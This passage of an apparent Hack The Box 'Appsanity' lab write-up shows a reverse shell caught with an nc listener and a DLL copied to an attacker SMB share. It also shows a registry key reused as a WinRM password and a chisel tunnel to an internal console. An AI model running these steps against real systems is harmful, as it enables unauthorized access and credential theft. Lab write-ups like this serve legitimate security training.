+<p>When submitting the link to internal port 8080 through the traditional web browser, we can see the response as a preview popup:</p>
+<p><img src="/post/hackthebox-appsanity/Images/ssrf1.png"
+	width="764"
+	height="500"
+	srcset="/post/hackthebox-appsanity/Images/ssrf1_huc500dc3fd2240a812acc0f65db925493_44697_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/ssrf1_huc500dc3fd2240a812acc0f65db925493_44697_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="152"
+		data-flex-basis="366px"
+	
+></p>
+<p>We can scroll to the left of the table, and we see a hyperlink for our upload:</p>
+<p><img src="/post/hackthebox-appsanity/Images/linkpreview.png"
+	width="465"
+	height="182"
+	srcset="/post/hackthebox-appsanity/Images/linkpreview_hufdfbd515a9525e12b65fe5f2247e73cd_22927_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/linkpreview_hufdfbd515a9525e12b65fe5f2247e73cd_22927_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="613px"
+	
+></p>
+<p><code>https://portal.meddigi.htb/ViewReport.aspx?file=62082e85-664a-4fc8-8eff-c0735d136fe0_shell.aspx</code></p>
+<p>We can try to access this file using LFI: Note that instead of using the domain name <code>portal.meddigi.htb</code>, we must continue using 127.0.0.1:8080.</p>
+<p><img src="/post/hackthebox-appsanity/Images/rce1.png"
+	width="948"
+	height="262"
+	srcset="/post/hackthebox-appsanity/Images/rce1_hufdacef20bd44bb5c36d40ca91c0060a7_23660_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/rce1_hufdacef20bd44bb5c36d40ca91c0060a7_23660_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="361"
+		data-flex-basis="868px"
+	
+></p>
+<p>On my listener port, I receive a connection:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Appsanity]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 80
+</span></span><span class="line"><span class="cl">listening on [any] 80 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.194] from (UNKNOWN) [10.10.11.238] 58166
+</span></span><span class="line"><span class="cl">Spawn Shell...
+</span></span><span class="line"><span class="cl">Microsoft Windows [Version 10.0.19045.3570]
+</span></span><span class="line"><span class="cl">(c) Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">c:\windows\system32\inetsrv&gt;whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">appsanity\svc_exampanel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We now have a reverse shell, as user <code>svc_exampanel</code>. At this point we can acquire the user flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c:\windows\system32\inetsrv&gt;dir C:\Users\svc_exampanel\Desktop
+</span></span><span class="line"><span class="cl">dir C:\Users\svc_exampanel\Desktop
+</span></span><span class="line"><span class="cl"> Volume in drive C has no label.
+</span></span><span class="line"><span class="cl"> Volume Serial Number is F854-971D
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> Directory of C:\Users\svc_exampanel\Desktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10/18/2023  05:41 PM    &lt;DIR&gt;          .
+</span></span><span class="line"><span class="cl">10/18/2023  05:41 PM    &lt;DIR&gt;          ..
+</span></span><span class="line"><span class="cl">11/03/2023  03:40 PM                34 user.txt
+</span></span><span class="line"><span class="cl">               1 File(s)             34 bytes
+</span></span><span class="line"><span class="cl">               2 Dir(s)   3,664,117,760 bytes free
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="lateral-movement">Lateral Movement</h2>
+<h3 id="enumerating-the-examinationpanel">Enumerating the ExaminationPanel</h3>
+<p>Within the <code>inetpub</code>, we can find several services. The MedDigi main page, the subdomain MedDigiPortal, and presumably the internal webpage we SSRF&rsquo;d as ExaminationPanel:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\inetpub&gt;ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:\inetpub
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name                                                                 
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----                                                                 
+</span></span><span class="line"><span class="cl">d-----         9/15/2023   7:22 AM                custerr                                                              
+</span></span><span class="line"><span class="cl">d-----         11/3/2023   5:17 PM                Databases                                                            
+</span></span><span class="line"><span class="cl">d-----         9/24/2023   8:49 AM                ExaminationPanel                                                     
+</span></span><span class="line"><span class="cl">d-----        10/23/2023  12:41 PM                history                                                              
+</span></span><span class="line"><span class="cl">d-----         9/15/2023   7:24 AM                logs                                                                 
+</span></span><span class="line"><span class="cl">d-----         9/24/2023   8:50 AM                MedDigi                                                              
+</span></span><span class="line"><span class="cl">d-----         9/24/2023   9:15 AM                MedDigiPortal                                                        
+</span></span><span class="line"><span class="cl">d-----         9/15/2023   7:22 AM                temp                                                                 
+</span></span><span class="line"><span class="cl">d-----         9/16/2023   9:58 AM                wwwroot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Our user cannot access MedDigi or MedDigiPortal</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\inetpub\&gt; ls C:\inetpub\MedDigi\
+</span></span><span class="line"><span class="cl">ls C:\inetpub\MedDigi\
+</span></span><span class="line"><span class="cl">ls : Access to the path &#39;C:\inetpub\MedDigi&#39; is denied.
+</span></span><span class="line"><span class="cl">At line:1 char:1
+</span></span><span class="line"><span class="cl">+ ls C:\inetpub\MedDigi\
+</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span class="line"><span class="cl">    + CategoryInfo          : PermissionDenied: (C:\inetpub\MedDigi\:String) [Get-ChildItem], UnauthorizedAccessExcept 
+</span></span><span class="line"><span class="cl">   ion
+</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>However, ExaminationPanel is accessible. Inside, we see an interesting <code>bin</code> folder containing a particularly interesting <code>dll</code> with a unique name:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\inetpub\ExaminationPanel\ExaminationPanel\bin&gt; ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:\inetpub\ExaminationPanel\ExaminationPanel\bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name                                                                 
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----                                                                 
+</span></span><span class="line"><span class="cl">d-----         9/24/2023   8:49 AM                roslyn                                                               
+</span></span><span class="line"><span class="cl">d-----         9/24/2023   8:49 AM                x64                                                                  
+</span></span><span class="line"><span class="cl">d-----         9/24/2023   8:49 AM                x86                                                                  
+</span></span><span class="line"><span class="cl">-a----         9/24/2023   8:46 AM        4991352 EntityFramework.dll                                                  
+</span></span><span class="line"><span class="cl">-a----         9/24/2023   8:46 AM         591752 EntityFramework.SqlServer.dll                                        
+</span></span><span class="line"><span class="cl">-a----         9/24/2023   8:46 AM          13824 ExaminationManagement.dll                                            
+</span></span><span class="line"><span class="cl">-a----         9/24/2023   8:46 AM          40168 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll               
+</span></span><span class="line"><span class="cl">-a----         9/24/2023   8:46 AM         431792 System.Data.SQLite.dll                                               
+</span></span><span class="line"><span class="cl">-a----         9/24/2023   8:46 AM         206512 System.Data.SQLite.EF6.dll                                           
+</span></span><span class="line"><span class="cl">-a----         9/24/2023   8:46 AM         206520 System.Data.SQLite.Linq.dll
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>ExaminationManagement.dll</code>  is clearly uniquely built for this environment, so it warrants a deeper look.</p>
+<h3 id="analyzing-examinationmanagementdll">Analyzing ExaminationManagement.dll</h3>
+<p>We can transfer the file using <code>impacket-smbserver</code>, then decompile in a local Windows environment through <a class="link" href="https://github.com/dnSpy/dnSpy"  target="_blank" rel="noopener"
+    >dnSpy</a>. First setting up smbserver on kali:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Appsanity]
+</span></span><span class="line"><span class="cl">└─$ impacket-smbserver asdf ./ -smb2support
+</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright 2023 Fortra
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Config file parsed
+</span></span><span class="line"><span class="cl">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span class="line"><span class="cl">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span class="line"><span class="cl">[*] Config file parsed
+</span></span><span class="line"><span class="cl">[*] Config file parsed
+</span></span><span class="line"><span class="cl">[*] Config file parsed
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, copying the file over:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\inetpub\ExaminationPanel\ExaminationPanel\bin&gt; copy .\EntityFramework.dll \\10.10.14.194\asdf\
+</span></span><span class="line"><span class="cl">copy .\EntityFramework.dll \\10.10.14.194\asdf\
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When we decompile, we can find an interesting behavior on how the service obtains a secret key for encryption; it is querying a registry key.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">string</span> <span class="n">RetrieveEncryptionKeyFromRegistry</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">string</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">try</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">using</span> <span class="p">(</span><span class="n">RegistryKey</span> <span class="n">registryKey</span> <span class="p">=</span> <span class="n">Registry</span><span class="p">.</span><span class="n">LocalMachine</span><span class="p">.</span><span class="n">OpenSubKey</span><span class="p">(</span><span class="s">&#34;Software\\MedDigi&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">registryKey</span> <span class="p">==</span> <span class="kc">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="n">ErrorLogger</span><span class="p">.</span><span class="n">LogError</span><span class="p">(</span><span class="s">&#34;Registry Key Not Found&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="k">base</span><span class="p">.</span><span class="n">Response</span><span class="p">.</span><span class="n">Redirect</span><span class="p">(</span><span class="s">&#34;Error.aspx?message=error+occurred&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="n">result</span> <span class="p">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This registry key should probably be something we can view as well:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\inetpub\examinationpanel\examinationpanel\bin&gt; reg query &#34;HKEY_LOCAL_MACHINE\SOFTWARE\MedDigi&#34;
+</span></span><span class="line"><span class="cl">reg query &#34;HKEY_LOCAL_MACHINE\SOFTWARE\MedDigi&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HKEY_LOCAL_MACHINE\SOFTWARE\MedDigi
+</span></span><span class="line"><span class="cl">    EncKey    REG_SZ    1g0tTh3R3m3dy!!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The key looks suspiciously like a password. With WinRM open, we can try a password spray to see if any users have this as their password. First, use <code>net user</code> to get a list of users on the system:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">User accounts for \\APPSANITY
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">Administrator            DefaultAccount           devdoc                   
+</span></span><span class="line"><span class="cl">Guest                    svc_exampanel            svc_meddigi              
+</span></span><span class="line"><span class="cl">svc_meddigiportal        WDAGUtilityAccount       
+</span></span><span class="line"><span class="cl">The command completed successfully.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since we are trying WinRM, we could also look for which users might have the privilege by being part of the Remote Users group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\inetpub\ExaminationPanel\ExaminationPanel\bin&gt; net localgroup &#39;Remote Management Users&#39;
+</span></span><span class="line"><span class="cl">net localgroup &#39;Remote Management Users&#39;
+</span></span><span class="line"><span class="cl">Alias name     Remote Management Users
+</span></span><span class="line"><span class="cl">Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Members
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">devdoc
+</span></span><span class="line"><span class="cl">The command completed successfully.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If this is a password for any user, it is likely for <code>devdoc</code>. Fortunately, it is!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Appsanity]
+</span></span><span class="line"><span class="cl">└─$ cme winrm meddigi.htb -u devdoc -p &#39;1g0tTh3R3m3dy!!&#39;               
+</span></span><span class="line"><span class="cl">SMB         meddigi.htb     5985   NONE             [*] None (name:meddigi.htb) (domain:None)
+</span></span><span class="line"><span class="cl">HTTP        meddigi.htb     5985   NONE             [*] http://meddigi.htb:5985/wsman
+</span></span><span class="line"><span class="cl">WINRM       meddigi.htb     5985   NONE             [+] None\devdoc:1g0tTh3R3m3dy!! (Admin!) 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="discovery-of-reports-management-console">Discovery of Reports Management Console</h3>
+<p>When enumerating internal ports, we can find yet another port we have not checked out before:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\devdoc\Desktop&gt; netstat -ano
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Active Connections
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Proto  Local Address          Foreign Address        State           PID
+</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:100            0.0.0.0:0              LISTENING       4776
+</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       916
+</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
+</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       4912
+</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4
+</span></span><span class="line"><span class="cl">  &lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notice the unusual port 100. We could have seen this earlier as <code>svc_exampanel</code>, but it is difficult to interact with through the reverse shell. Now with Evil-WinRM, we can easily establish a tunnel using chisel, then interact with the port on our local kali. First, uploading chisel:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">devdoc</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">upload</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">chisel</span><span class="o">/</span><span class="n">chisel</span><span class="o">.</span><span class="n">exe</span>
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl"><span class="n">Info</span><span class="p">:</span> <span class="n">Uploading</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">chisel</span><span class="o">/</span><span class="n">chisel</span><span class="o">.</span><span class="n">exe</span> <span class="n">to</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">devdoc</span>\<span class="n">Desktop</span>\<span class="n">chisel</span><span class="o">.</span><span class="n">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Data</span><span class="p">:</span> <span class="mi">12008104</span> <span class="n">bytes</span> <span class="n">of</span> <span class="mi">12008104</span> <span class="n">bytes</span> <span class="n">copied</span>
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl"><span class="n">Info</span><span class="p">:</span> <span class="n">Upload</span> <span class="n">successful</span><span class="o">!</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On kali, establish a reverse chisel listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[/opt/chisel]
+</span></span><span class="line"><span class="cl">└─$ ./chisel server -p 8000 --reverse
+</span></span><span class="line"><span class="cl">2023/11/01 17:00:04 server: Reverse tunnelling enabled
+</span></span><span class="line"><span class="cl">2023/11/01 17:00:04 server: Fingerprint dvjvmDdco0ZHxnPqgpFqF8Jv/zSQPmy1DNlrftgZWWs=
+</span></span><span class="line"><span class="cl">2023/11/01 17:00:04 server: Listening on http://0.0.0.0:8000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally, connect with <code>chisel.exe</code> on the target:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.\chisel.exe client 10.10.14.134:8000 R:100:127.0.0.1:100
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can interact with the port using <code>nc</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Appsanity</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">nc</span> <span class="n">localhost</span> <span class="mi">100</span>
+</span></span><span class="line"><span class="cl"><span class="n">Reports</span> <span class="n">Management</span> <span class="n">administrative</span> <span class="n">console</span><span class="o">.</span> <span class="n">Type</span> <span class="s2">&#34;help&#34;</span> <span class="n">to</span> <span class="n">view</span> <span class="n">available</span> <span class="n">commands</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">help</span>
+</span></span><span class="line"><span class="cl"><span class="n">Available</span> <span class="n">Commands</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">backup</span><span class="p">:</span> <span class="n">Perform</span> <span class="n">a</span> <span class="n">backup</span> <span class="n">operation</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">validate</span><span class="p">:</span> <span class="n">Validates</span> <span class="k">if</span> <span class="n">any</span> <span class="n">report</span> <span class="n">has</span> <span class="n">been</span> <span class="n">altered</span> <span class="n">since</span> <span class="n">the</span> <span class="n">last</span> <span class="n">backup</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">recover</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Restores</span> <span class="n">a</span> <span class="n">specified</span> <span class="n">file</span> <span class="n">from</span> <span class="n">the</span> <span class="n">backup</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Reports</span> <span class="n">folder</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">upload</span> <span class="o">&lt;</span><span class="n">external</span> <span class="n">source</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Uploads</span> <span class="n">the</span> <span class="n">reports</span> <span class="n">to</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">external</span> <span class="n">source</span><span class="o">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We are given several options, and they seem to be related to the Reports folder that we might find back at <code>C:\inetpub\ExaminationPanel\ExaminationPanel\Reports</code>. If we look at Program Files, we can find a folder for this Reports Management tool. Note that this is where lateral movement to <code>devdoc</code> is necessary, as our other user cannot access this folder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Program Files\ReportManagement&gt; ls
+</span></span><span class="line"><span class="cl">
